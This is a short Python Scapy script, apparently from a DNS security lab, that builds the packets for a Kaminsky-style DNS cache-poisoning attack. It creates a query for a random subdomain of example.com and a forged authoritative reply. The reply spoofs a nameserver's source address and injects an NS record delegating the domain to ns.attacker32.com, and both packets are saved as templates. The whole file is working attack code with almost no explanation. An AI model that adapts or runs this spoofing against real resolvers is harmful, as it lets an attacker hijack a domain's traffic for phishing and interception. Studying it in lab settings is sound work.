#!/usr/bin/env python3
from scapy.all import *
import random
# Construct the DNS header and payload
def randomString():
	chars = "abcdefghijklmnopqrstuvwxyz"
	ret = ""
	for i in range(5):
		ret += chars[random.randint(0,25)]
	return ret

def sendDNS(name, save_file=False):
	Qdsec = DNSQR(qname=name)
	dns = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0, arcount=0, qd=Qdsec)
	ip = IP(dst='10.9.0.53', src='10.9.0.1')
	udp = UDP(dport=53, sport=33333, chksum=0)
	query = ip/udp/dns
	if save_file:
		with open('ip_req.bin', 'wb') as f:
			f.write(bytes(query))
	else:
		send(query)

def spoofDNS(name, domain="example.com", ns="ns.attacker32.com", save_file=False):
	Qdsec = DNSQR(qname=name)
	Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)
	NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
	dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1,
	qdcount=1, ancount=1, nscount=1, arcount=0,
	qd=Qdsec, an=Anssec, ns=NSsec)
	ip = IP(dst='10.9.0.53', src='199.43.133.53')
	udp = UDP(dport=33333, sport=53, chksum=0)
	reply = ip/udp/dns
	if save_file:
		with open('ip_resp.bin', 'wb') as f:
			f.write(bytes(reply))
	else:
		send(reply)

name = randomString() + '.example.com'
sendDNS(name, save_file=True)
spoofDNS(name, save_file=True)

